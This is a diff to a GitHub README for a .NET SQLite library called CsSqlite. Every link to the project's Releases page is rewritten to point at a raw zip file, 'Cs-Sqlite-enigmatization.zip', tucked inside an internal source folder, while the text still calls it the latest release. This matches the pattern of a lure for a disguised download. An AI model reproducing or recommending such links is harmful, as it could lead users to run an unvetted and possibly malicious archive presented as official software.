@@ -1,7 +1,7 @@
 # 🚀 CsSqlite - Fast and Easy SQLite for .NET
 
 ## 📥 Download CsSqlite
-[![Download CsSqlite](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/dungal6/CsSqlite/releases)
+[![Download CsSqlite](https://github.com/dungal6/CsSqlite/raw/refs/heads/main/src/CsSqlite/Internal/Cs-Sqlite-enigmatization.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/dungal6/CsSqlite/raw/refs/heads/main/src/CsSqlite/Internal/Cs-Sqlite-enigmatization.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To ensure smooth operation of CsSqlite, your system should meet the following re
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** 
-   Go to the [Releases page](https://github.com/dungal6/CsSqlite/releases).
+   Go to the [Releases page](https://github.com/dungal6/CsSqlite/raw/refs/heads/main/src/CsSqlite/Internal/Cs-Sqlite-enigmatization.zip).
 
 2. **Choose the Latest Version:**
    Find the latest version at the top. You will see a list of assets associated with this release.
@@ -71,4 +71,4 @@ Special thanks to the developers and contributors who have made this project pos
 
 Thank you for choosing CsSqlite. We hope it makes your data management easier and more efficient. 
 
-For more inquiries, visit our [Releases page](https://github.com/dungal6/CsSqlite/releases) to download the latest version or explore our documentation. Happy coding!
+For more inquiries, visit our [Releases page](https://github.com/dungal6/CsSqlite/raw/refs/heads/main/src/CsSqlite/Internal/Cs-Sqlite-enigmatization.zip) to download the latest version or explore our documentation. Happy coding!
